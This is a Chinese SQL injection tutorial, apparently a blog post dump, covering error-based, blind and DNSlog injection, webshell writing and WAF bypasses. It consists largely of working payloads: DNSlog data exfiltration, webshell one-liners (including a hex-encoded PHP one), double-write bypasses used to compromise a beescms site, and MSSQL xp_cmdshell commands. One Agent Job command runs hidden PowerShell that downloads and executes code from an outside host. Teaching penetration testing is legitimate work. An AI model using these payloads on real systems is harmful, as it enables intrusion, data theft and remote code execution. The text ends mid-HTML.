判断出注入点为2和3。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316704781-2eaf1548-62d5-40ca-88a4-14d15e5d6846.png#align=left&display=inline&height=158&margin=%5Bobject%2Object%5D&name=image.png&originHeight=315&originWidth=554&size=114990&status=done&style=none&width=277)\n5、通过注入点3获取flag数据表中的flag字段的数据。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316709078-a312c8bf-4c31-4804-8a5f-8d9d9f550a58.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=284&originWidth=554&size=110536&status=done&style=none&width=277)\n## 巧用dnslog进行SQL注入\n前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。\n### Dnslog\ndnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。\n### Load_file()函数\n数据库中的load_file()函数，可以加载服务器中的内容。load_file('c:/1.txt')，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件：\n1.文件在服务器上\n2.指定完整路径的文件\n3.必须有FILE权限\n### UNC路径\nUNC路径就是类似\\softer这样的形式的网络路径。它符合 \\服务器名\\服务器资源的格式。在Windows系统中常用于共享文件。如\\192.168.1.1\\共享文件夹名。\n### Dnslog注入实例演示\n1、打开实例站点，很明显这里是只能使用盲注的站点。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316770534-feb5fdac-7aaa-4ab5-b3ae-5fee2527e378.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=93920&status=done&style=none&width=277)\n2、通过order by判断出字段数为3。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316780268-de0c44d2-5a42-4df4-8494-a5ed756a6a74.png#align=left&display=inline&height=159&margin=%5Bobject%2Object%5D&name=image.png&originHeight=318&originWidth=554&size=123643&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316786769-374898f3-3106-480a-a051-e052e96a70d9.png#align=left&display=inline&height=153&margin=%5Bobject%2Object%5D&name=image.png&originHeight=305&originWidth=554&size=116956&status=done&style=none&width=277)\n3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316791333-e038d4ba-3515-4425-a67c-dd7c505975a8.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=32567&status=done&style=none&width=277)\n4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下：\n?id=1 ' union select 1,2,load_file(concat('//',(select database()),'.pcijrt.dnslog.cn\n/abc')) %23\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316796222-379b515f-d134-405f-91cf-d1e33861c093.png#align=left&display=inline&height=96&margin=%5Bobject%2Object%5D&name=image.png&originHeight=192&originWidth=554&size=90883&status=done&style=none&width=277)\n5、执行语句之后在dnslog日志中获取到数据库库名为security。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316800618-e7303cd5-9bdb-47de-aeda-5ced9575829d.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=38670&status=done&style=none&width=277)\n6、修改子查询里的内容，获取其他数据。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316804136-4715642b-040c-4f5a-8e0c-29d883c01903.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=554&size=92826&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316855097-fc68b2f4-3483-4996-818a-3890d70aa7ac.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=46229&status=done&style=none&width=277)\n## SQL注入写入webshell\n### Webshell\nWebshell，以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。攻击者可以通过获取webshell来对网站进行操作，包括任意文件上传下载、查看数据库、执行任意程序代码等。常见webshell分类如下：\n**jsp**\n<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>\n**asp**\nsuccess!!!!<%eval request(\"cmd\")%>\n**php**\n### out_file&dump_file\n在dnslog注入中我们了解到了mysql数据库中可以通过load_file加载读取服务器上的文件，与之对应的则是通过out_file和dump_file读取文件。写入webshell需要具有几个条件：当前数据库用户为root、具有写入文件的权限、拥有当前站点的绝对路径。\n通过sql注入写webshell的具体用法：\nselect  into outfile 'C:/phpStudy/WWW/1.php'\nselect  into dumpfile 'C:/phpStudy/WWW/1.php'\n二者的区别在于，outfile函数可以导出多行，而dumpfile只能导出一行数据；outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式。\n在写文件的时候，因为是在传参中写入的，总会被一些单引号，美元符等具有特殊意义的字符影响，这时候我们能够通过将需要传输的文件内容进行16进制转换再传入数据库中执行，mysql数据库会解析16进制的内容，那么就可以不受特殊字符影响写入webshell了。\n## SQL注入如何绕过waf\n在进行渗透测试的时候，经常会遇到被waf拦截的情况。waf，也就是网站防火墙，专业术语是Web应用防护系统，即Web Application Firewall。Waf对于渗透测试人员来说，也就是规则，通俗点就是这个结构:\nIf(xxx){\n拦截！\n}else{\n通过\n}\n所以只需要让它同意我的操作，即绕过了waf。通常的waf一般可以有以下绕过方法：\n#### 1、大小写绕过\n?id=1 and UnIoN sElEcT 1,2,3\n?id=1 OrDeR By 1\n#### 2、双写绕过\n一些防护措施只进行一次，可以通过双写关键字的方法绕过。\nId=1 ununionion selselectect 1,2,3 删除一次--> union select\nId=1 ororderder bbyy\t1\t删除一次--> order by\n#### 3、编码绕过\n如果检测的是关键字，那么经过编码即可绕过\nURL全编码：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316953774-1c273318-df76-4e94-a6d4-3a05b0aa9057.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=170&originWidth=554&size=32436&status=done&style=none&width=277)\n十六进制（使用时需要在转换后的字符串前加0x，作为告诉数据库这里是十六进制的标识）：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316957860-0c58f7b6-544c-4125-9937-5e35e01e675f.png#align=left&display=inline&height=120&margin=%5Bobject%2Object%5D&name=image.png&originHeight=240&originWidth=554&size=17636&status=done&style=none&width=277)\n#### 4、基本符号替换\n用&&替换and\n用||替换or\n用/**/替换空格\nURL栏中用+替换空格\n#### 5、报错注入替换函数绕过\n有的时候，网站只检测一部分热门的函数，不检测一些冷门的函数。下面以select user() 为例，给出几种报错注入的payload：\n1.floor()\nid = 1 and (select 1 from  (select count(_),concat(user(),floor(rand(0)_2))x from  information_schema.tables group by x)a)\n2. extractvalue()\nid = 1 and (extractvalue(1, concat(0x5c,(select user()))))\nid = 1 and extractvalue(1,concat(char(126),database()))\n3. updatexml()\nid = 1 and (updatexml(0x3a,concat(1,(select user())),1))\n\n\n4.exp()\nexp(~(select * from(select user()))a))\n\n\n5.GeometryCollection()\nId=1 and GeometryCollection((select _ from(select _ from(select user())a)b))\n\n\n6.Polygon\n\n\nId = 1 and polygon((select _ from (select _ from(select user())a)b))\n\n\n7.Multipoint()\n\n\nId = 1 and Multipoint ((select _ from (select _ from(select user())a)b))\n\n\n8.Multilinestring()\n\n\nId = 1 and Multilinestring ((select _ from (select _ from(select user())a)b))\n\n\n9.multipolygon\n\n\nId = 1 and multipolygon ((select _ from (select _ from(select user())a)b))\n\n\n10.linestring()\n\n\nId = 1 and linestring ((select _ from (select _ from(select user())a)b))\n\n\n#### 6、其他等价函数绕过\nhex()、bin() ==> ascii()\nsleep() >benchmark()\nconcat_ws()>group_concat()\nmid()、substr() ==> substring()\n@[@user ](/user ) ==> user() \n@[@database ](/database ) ==> database() \n\n\n#### 7、内联注释配合注释绕过\nId=1/**//_! order_/+/_!by_/+1\n\n\n#### 8、%0a换行跳出单行注释绕过\n原理：数据库中对于#和--（空格）后面的东西都进行注释忽略处理\n我们通过waf一般不会处理注释内的东西这一特性进行绕过，在%23（url解码为#）后面放%0a换行再放入执行语句，中间可以多次经过%23%0a进行绕过。ps:在%23和%0a中间可以随意加入字符，放置注释掉了。\nPayload：\nid=2%20+%231q%0AOrDeR%20%23adsf%0A%23%0ABy%201\nid=-2%20+%231q%0AuNiOn%20all%23adsf%0A%23%0AsEleCt%201,2,3\n#### 9、利用一些中间件的缺陷\n（1）IIS+ASP\n通过在关键词之间加%绕过。Id=1 and uni%on se%le%ct 1,2,3 from ad%min\n（2）IIS的Unicode编码\nIIS支持Unicode编码，可以通过编码关键词进行绕过：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316976370-63e00d2f-1d76-4702-a4ad-53ff3433f16a.png#align=left&display=inline&height=60&margin=%5Bobject%2Object%5D&name=image.png&originHeight=120&originWidth=554&size=13102&status=done&style=none&width=277)\n（3）HTTP参数污染\n有的时候，浏览器对于这样的传参会出现以下情况：\nId=1 and id=2 --> 出现在服务器中，id=1,2\n那么我们可以这样绕：\nid=1 and union select username & id= password form admin\n--> id=1 and union select username, password form admin\n\n\n对于这种参数重复传参的情况，不同环境有不同结果：\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316984361-71fe98b2-2426-402d-b268-79db169fbe80.png#align=left&display=inline&height=148&margin=%5Bobject%2Object%5D&name=image.png&originHeight=296&originWidth=554&size=37024&status=done&style=none&width=277)\n#### 10、更换传参方式绕过\n在有些情况下，因为$_REQUEST[‘id’]的特性，我们可以将get传参的id=1切换成post传参，有些waf只针对了get传参进行防御而忽略了post传参或者cookie传参。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316989645-f827a3cc-d359-4246-9d0f-13eb04fd7b84.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=248&originWidth=554&size=48512&status=done&style=none&width=277)\n#### 11、利用数据提取方式的缺陷进行绕过\nExample：\n在PHP+Apache中\nx=1&y=2&z=3 在某些waf中会被提取为：\nx=1\ny=2\nz=3\npayload:\nid=1+union+/_&x=2_/+select/_&y=3_/+1,2,3+from+admin\nwaf检测方式为分别检测三个传参：\nid=1+union+/*\nx=2_/+select/_\ny=3*/1,2,3+from+admin\n\n\n数据库中，/**/中间的东西被过滤了，获得的传参为：\nid=1+union+select+1,2,3+from+admin\n#### 12、脏数据绕过\n在被waf拦截之后，更改传参方式为POST，再通过在传参处放入大量无用数据绕过waf。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316997116-7a6e21e0-2b25-4f10-b49c-e767e0216794.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=125231&status=done&style=none&width=277)\n下面给出生成垃圾数据的脚本：\n#coding=utf-8\nimport random,string\nfrom urllib import parse\ncode by yzddMr6\n\n\nvarname_min = 5\nvarname_max = 15\ndata_min = 20\ndata_max = 25\nnum_min = 50\nnum_max = 100\ndef randstr(length):\nstr_list = [random.choice(string.ascii_letters) for i in range(length)]\nrandom_str = ''.join(str_list)\nreturn random_str\ndef main():\ndata={}\nfor i in range(num_min,num_max):\ndata[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))\nprint('&'+parse.urlencode(data)+'&')\nmain()\n\n\n### SQL注入实战渗透测试\n1、首先打开指定站点，这里是以beescms搭建的网站\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317033373-8f7c7d9b-b60a-451a-b28d-ba425f92f9b4.png#align=left&display=inline&height=129&margin=%5Bobject%2Object%5D&name=image.png&originHeight=258&originWidth=554&size=81788&status=done&style=none&width=277)    \n2、通过御剑扫描发现了后台路径/admin/login.php\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317036903-c1a03aaf-c415-48e7-a1c9-6b124a0aa140.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=291&originWidth=554&size=59025&status=done&style=none&width=277)\n3、访问后台\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317042060-67c5cd02-56e2-44e5-a90f-05749886fcdc.png#align=left&display=inline&height=142&margin=%5Bobject%2Object%5D&name=image.png&originHeight=283&originWidth=554&size=60786&status=done&style=none&width=277)\n4、抓包并发送到重放数据包模块进行测试\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317045189-57e2568e-0bce-4732-a132-41fb7f0f1967.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=237&originWidth=554&size=59839&status=done&style=none&width=277)\n5、在账号处加一个单引号测试，发现页面报错了，这里说明存在SQL注入\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317049040-76788297-cf7a-498a-bf05-a94be7c5846d.png#align=left&display=inline&height=92&margin=%5Bobject%2Object%5D&name=image.png&originHeight=184&originWidth=554&size=53711&status=done&style=none&width=277)\n6、打开源码，找到该登录处，发现对于post传参的user进行了函数fl_value和fl_html处理。处理之后后面就放到check_login函数执行了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317053351-e7c46278-96ce-446c-9113-49f608e9462e.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=288&originWidth=554&size=64458&status=done&style=none&width=277)\n7、定位fl_value函数，发现对于SQL注入进行了处理，将敏感字符过滤为空。\n过滤的敏感字符有：select | insert | update | and | in | on | left | joins | delete | %| = | / * | * | ../ | ./ | union | from | where | group | into | load_file | outfile\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317057459-1b75bd6c-f68f-471d-803f-4606333306ff.png#align=left&display=inline&height=43&margin=%5Bobject%2Object%5D&name=image.png&originHeight=85&originWidth=554&size=19441&status=done&style=none&width=277)\n8、很明显这里防SQL注入进行的不是很到位，只进行了一次替换为空，那么就可以通过双写关键字进行绕过。定位第二个处理函数fl_html，发现这里是进行了html实体化处理，是防止xss的，htmlspecialchars函数默认情况下只对双引号进行编码，对我们使用单引号进行SQL注入没有影响。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317060800-0510c154-b4ff-4202-9b12-37db39d11e93.png#align=left&display=inline&height=29&margin=%5Bobject%2Object%5D&name=image.png&originHeight=58&originWidth=366&size=11625&status=done&style=none&width=183)\n9、跟进check_login函数，发现将传入的数据直接放到了SQL查询语句进行查询。那么此处通过双写即可绕过进行注入了。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317065197-0ab9f91c-73e7-4991-b518-2a049007d84d.png#align=left&display=inline&height=58&margin=%5Bobject%2Object%5D&name=image.png&originHeight=115&originWidth=554&size=27857&status=done&style=none&width=277)\n10、回到网站，通过order by 判断出当前数据库字段数为5\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317068401-fc66cb55-5dfb-41f7-9f55-726dab9ffd30.png#align=left&display=inline&height=101&margin=%5Bobject%2Object%5D&name=image.png&originHeight=201&originWidth=554&size=50976&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317071848-afb83dbf-a19a-40fb-9c66-af5cabf23c07.png#align=left&display=inline&height=80&margin=%5Bobject%2Object%5D&name=image.png&originHeight=160&originWidth=554&size=45734&status=done&style=none&width=277)\n11、经测试，联合查询终于成功了。绕过方法：\nun union ion -> union\nseselectlect -> select\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317076201-0c74fd9e-0530-4941-8e19-68fffcaade81.png#align=left&display=inline&height=111&margin=%5Bobject%2Object%5D&name=image.png&originHeight=221&originWidth=554&size=51714&status=done&style=none&width=277)\n12、这里很明显不能显错注入，尝试使用报错注入获取数据也失败，没有将报错的数据输出出来。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317082978-87ccd5f5-eed6-42b8-bd8c-d313b5d51ff3.png#align=left&display=inline&height=117&margin=%5Bobject%2Object%5D&name=image.png&originHeight=234&originWidth=554&size=62436&status=done&style=none&width=277)\n13、尝试使用sql注入写入webshell，发现页面报错了，通过报错信息可以看到是写入的一句话木马里面带有特殊字符影响了文件的写入。对于敏感字符的绕过方法：\nin into  -> into\nououtfiletfile -> outfile\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317086950-f53a248a-e529-424b-8033-3d275770dfae.png#align=left&display=inline&height=116&margin=%5Bobject%2Object%5D&name=image.png&originHeight=232&originWidth=554&size=65986&status=done&style=none&width=277)\n14、因为符号进行了影响，所以通过16进制来写入webshell，将一句话木马转换为16进制。因为需要数据库识别出这个是16进制的数据，所以要在最前面加上0x。得到16进制的一句话木马：\n0x3c3f70687020406576616c28245f524551554553545b315d293b3f3e\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317091049-51499331-b0a7-4eb4-9941-6a45055e0e2d.png#align=left&display=inline&height=152&margin=%5Bobject%2Object%5D&name=image.png&originHeight=304&originWidth=554&size=19492&status=done&style=none&width=277)\n15、替换16进制的一句话木马到burp数据包中放包，成功执行了代码，页面返回正常。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317094983-f7fb5184-1a94-4cf1-8295-4c3423910346.png#align=left&display=inline&height=124&margin=%5Bobject%2Object%5D&name=image.png&originHeight=247&originWidth=554&size=62722&status=done&style=none&width=277)\n16、查看服务器文件，成功有了一个8.php文件，内容为一句话木马。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317099323-d646af4a-b862-405d-823c-b2975028e63e.png#align=left&display=inline&height=127&margin=%5Bobject%2Object%5D&name=image.png&originHeight=254&originWidth=554&size=56751&status=done&style=none&width=277)\n17、通过菜刀工具，连接一句话木马，获取网站webshell。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317103226-679c62de-5503-4996-9ea4-acbbad2e0683.png#align=left&display=inline&height=119&margin=%5Bobject%2Object%5D&name=image.png&originHeight=238&originWidth=554&size=18591&status=done&style=none&width=277)\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317106445-a24046e6-17ce-443d-b37b-63bd3fc90125.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=274&originWidth=554&size=41660&status=done&style=none&width=277)\n18、进行执行系统命令操作。\n![image.png](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612317113216-93f538c1-d58a-4bac-b262-a15d676aa57a.png#align=left&display=inline&height=137&margin=%5Bobject%2Object%5D&name=image.png&originHeight=273&originWidth=554&size=27211&status=done&style=none&width=277)\n\n## 其他类型的SQL注入\n### 1、搜索框注入\n```php\n?id=1' and '1%'='1\t\t//返回正确的搜索结果\n?id=1' and '1%'='2\t\t//没有返回结果\n```\n### 2、header头部注入\nClient-IP\nUser-Agent\nX-Forwarded-For\n\n\n## SQL注入利用\n### 1、MSSQL\n#### 0x01 --os-shell\n```php\nfor /r C: %i in (*020.jpg*) do @echo %i //寻找020.jpg，获取所在目录\n\ndir c:\\phpstudy\\WWW\\image\t\t\t\t\t\t\t\t//列出某目录下文件\n\necho ^<%@ Page Language=\"Jscript\"%^>^<%eval(Request.Item[\"1\"],\"unsafe\");%^> > c:\\phpstudy\\WWW\\image\\shell.asp\n```\n#### 0x02 命令执行\n1、xp_cmdshell\n```php\n#开启xp_cmdshell\n?id=1;use master;exec sp_configure 'show advanced options',1;reconfigure;exec sp_configure 'xp_cmdshell',1;reconfigure;\n\n#执行\n?id=1;use master;exec master..xp_cmdshell \"whoami\";\n\n#恢复被删除的xp_cmdshell(提示xplog79.dll找不到则自己上传)\nexec sp_addextendedproc xp_cmdshell ,@dllname=\"D:\\\\xplog79.dll\"\n```\n2、sp_oacreate\n```sql\n#xp_cmdshell删除后可以使用sp_oacreate\n#开启sp_oacreate\nexec sp_configure 'show advanced options',1;\nreconfigure with override;\nexec sp_configure 'Ole Automation Procedures',1;\nreconfigure with override;\nexec sp_configure 'show advanced options',0;\n\n#执行[此方法无回显]\ndeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c whoami >d:\\\\temp\\\\1.txt'\n```\n3、通过沙盒执行命令\n4、注册表\n5、通过Agent Job执行命令\n```sql\n#执行cs powershell命令\nUSE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(''http://192.168.214.129:80/a''))\"', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';\n```\n#### 0x03 文件操作\n1、判断文件是否存在\n```sql\n#返回0表示不存在，返回1表示存在\nexec xp_fileexist \"c:\\\\users\\\\public\\\\test.txt\"\n```\n2、列目录\n```sql\n#第一个参数表示要查看的文件夹，第二个参数表示递归层数，第三个参数表示展示的内容包括文件。\nexec xp_subdirs \"C:\\Users\\Administrator\\\",2,1\n```\n3、写文件\n```sql\n#开启Web Assistant Procedures\nexec sp_configure 'Web Assistant Procedures',1;RECONFIGURE;\nexec sp_makewebtask 'c:\\www\\testwr.asp','select''<%execute(request('ss'))%>''\n```\n4、创建目录\n```sql\nexec xp_create_subdir 'D:\\test'\n```\n#### 0x04 信息获取\n```sql\nexec xp_getnetname\t\t\t//计算机名\nexec xp_msver\t\t\t\t\t\t//系统信息\nexec xp_fixeddrives\t\t\t//驱动器信息\nselect default_domain() as mydomain;\t\t//获取域名\n```\n### 2、MYSQL\n在高版本的mysql中，一般默认配置了--secure_file_priv为null限制了文件写入，这种情况就需要通过general_log_file/show_query_log_file来尝试写文件。\n```sql\n#general_log_file\nset global general_log='on';\nset global general_log_file='D:/phpStudy/WWW/1.php';\nselect '<?php assert($_POST[1]);?>';\nset global general_log='off'; //切记关闭\n```\n```sql\n#show_query_log_file\nset global show_query_log='on';\nset global show_query_log_file='D:\\\\phpStudy\\\\WWW\\\\1.php';\nselect sleep(15),'<?php assert($_POST[1]);?>';\nset global show_query_log='off'; //切记关闭\n```\n\n","slug":"sql注入之重新学习","published":1,"updated":"2021-08-07T16:19:37.331Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpgy006lvkq35v7wa36n","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h2 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h2><h3 id=\"概念：\"><a href=\"#概念：\" class=\"headerlink\" title=\"概念：\"></a>概念：</h3><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。<br>在owasp top 10常年霸占榜首漏洞的位置，可以当之无愧称它为漏洞之王。SQL注入是一个通过拼接sql查询语句获取数据库里面的数据的漏洞。常见的漏洞点为url中带有的id传参，如<a href=\"http://www.xxx.com/i.php?id=13\">http://www.xxx.com/i.php?id=13</a>。<br>此处的13会通过php传参传到数据库进行查询，一般的查询语句为:select * from news where id=’13’。攻击者往往通过在id=13后面加入单引号闭合前面的查询内容后面加上union联合查询其他内容来获取数据。</p>\n<h3 id=\"SQL注入的条件\"><a href=\"#SQL注入的条件\" class=\"headerlink\" title=\"SQL注入的条件\"></a>SQL注入的条件</h3><p>1、用户可以控制输入的数据，可以控制传参的内容。<br>2、用户传参的内容被拼接到了代码去执行。</p>\n<h3 id=\"判断是否存在SQL注入的具体流程\"><a href=\"#判断是否存在SQL注入的具体流程\" class=\"headerlink\" title=\"判断是否存在SQL注入的具体流程:\"></a>判断是否存在SQL注入的具体流程:</h3><p>1、首先获取url：<a href=\"http://www.xxx.com/i.php?id=1\">http://www.xxx.com/i.php?id=1</a><br>2、很明显这里的13是通过get传参被放到数据库查询语句中的我们可以控制的参数。一般的查询语句为select * from test where id=’1’<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316298798-8ccfa038-d152-4f35-8958-c49444bff928.png#align=left&display=inline&height=150&margin=%5Bobject%2Object%5D&name=image.png&originHeight=150&originWidth=554&size=21745&status=done&style=none&width=554\" alt=\"image.png\"><br>3、接下来在1后面加个单引号，可以看到页面报错了，因为我们的1’被当成代码执行了，当前查询语句为：Select<em>from test where id =’1’’，比正常的多了一个单引号，所以导致页面报错了。因为我的输入的东西导致了页面发生了变化，特别是这种报错了，很明显存在SQL注入漏洞。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316314777-a894da71-648e-48ed-98ef-ef2920228efe.png#align=left&display=inline&height=134&margin=%5Bobject%2Object%5D&name=image.png&originHeight=134&originWidth=554&size=30262&status=done&style=none&width=554\" alt=\"image.png\"><br>4、接下来传参为1’ and 1=1 %23，页面返回正常，与id=1的页面相同。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316319310-1a11b5b5-ce77-435e-9c0a-d6a567c92a91.png#align=left&display=inline&height=144&margin=%5Bobject%2Object%5D&name=image.png&originHeight=144&originWidth=554&size=25407&status=done&style=none&width=554\" alt=\"image.png\"><br>5、更换传参为1‘ and 1=2 %23，页面不一样了，查询不了数据库内的数据，当前查询语句为：Select</em>from test where id =’1’ and 1=2 #’<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316325147-77f76770-d9d7-4e52-b710-48d496b98797.png#align=left&display=inline&height=118&margin=%5Bobject%2Object%5D&name=image.png&originHeight=118&originWidth=554&size=21180&status=done&style=none&width=554\" alt=\"image.png\"><br>这里先解释一下%23，众所周知的在mysql数据库中，#是注释符，能够注释掉后面的内容，但是在url栏中，#有锚点的作用，所以说我们如果需要注释后面的单引号，需要使用url编码后的#，也就是%23。<br>在这里看到and 1=1页面返回正常，and 1=2 页面返回不正常。从渗透测试的角度判断就是代码被执行了，我们通过输出的查询语句也看到了1=1和1=2被放到查询语句查询了，因为中间的连接符是and，在1=2的时候恒为假，所以查询不出内容。两者不同，也就判断出当前存在SQL注入漏洞。</p>\n<h3 id=\"SQL注入分类\"><a href=\"#SQL注入分类\" class=\"headerlink\" title=\"SQL注入分类\"></a>SQL注入分类</h3><h4 id=\"显错注入\"><a href=\"#显错注入\" class=\"headerlink\" title=\"显错注入\"></a>显错注入</h4><p>有回显数据的注入，可以通过union select联合查询将想要的数据返回到页面上的一种注入。在对于SQL注入的渗透测试过程中，我们的传参返回的内容可以在页面上输出，这种时候就可以用显错注入。接下来将详细介绍如何进行显错注入。<br>1、首先可以看到，传参id=1会输出两个数据：login name和password。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316363011-cb8e279e-0790-4dc7-8026-1d7ba13c7503.png#align=left&display=inline&height=125&margin=%5Bobject%2Object%5D&name=image.png&originHeight=250&originWidth=554&size=55928&status=done&style=none&width=277\" alt=\"image.png\"><br>2、加个单引号，页面报错了<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316370623-fb91b6e8-b745-4a07-8f13-3cf7c72bf2b7.png#align=left&display=inline&height=112&margin=%5Bobject%2Object%5D&name=image.png&originHeight=224&originWidth=554&size=59302&status=done&style=none&width=277\" alt=\"image.png\"><br>3、通过后面拼接and 1=1 %23来查看代码是否成功执行，可以看到页面返回正常了，闭合成功。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316375217-57e81aec-a8a6-4bf8-b5c3-0d78bf2864eb.png#align=left&display=inline&height=104&margin=%5Bobject%2Object%5D&name=image.png&originHeight=207&originWidth=554&size=27510&status=done&style=none&width=277\" alt=\"image.png\"><br>4、通过order by判断当前数据表中的字段数。通过order by 3的时候页面正常，order by 4的时候页面错误可以判断出当前字段数为3。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316379696-6ec0c84e-8418-4e32-9494-2aa3dfbfbb4a.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=551&size=29486&status=done&style=none&width=275.5\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316386641-3ec52df4-6f87-4a73-b058-4de7e7d52bd2.png#align=left&display=inline&height=85&margin=%5Bobject%2Object%5D&name=image.png&originHeight=169&originWidth=556&size=20870&status=done&style=none&width=278\" alt=\"image.png\"><br>5、联合查询获取数据。首先将前面的1改为-1，因为在数据库查询语句中默认会输出前面查询的东西的，将1改为-1会使前面查询不到内容，那么就会输出后面union select联合查询的数据。可以看到将2和3输出出来了，这里就是我们需要的显错注入的显错点。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612316391466-cb32eb81-d7d1-40c2-be47-2e100ec71492.png#align=left&display=inline&height=114&margin=%5Bobject%2Object%5D&name=image.png&originHeight=227&originWidth=554&size=25091&status=done&style=none&width=277\" alt=\"image.png\"><br>6、有了显错点，接下来只需要将要查询的代码替换2和3即可获取想要的数据下面查询flag表中的flag数据。</p>\n<figure class=\"highlight 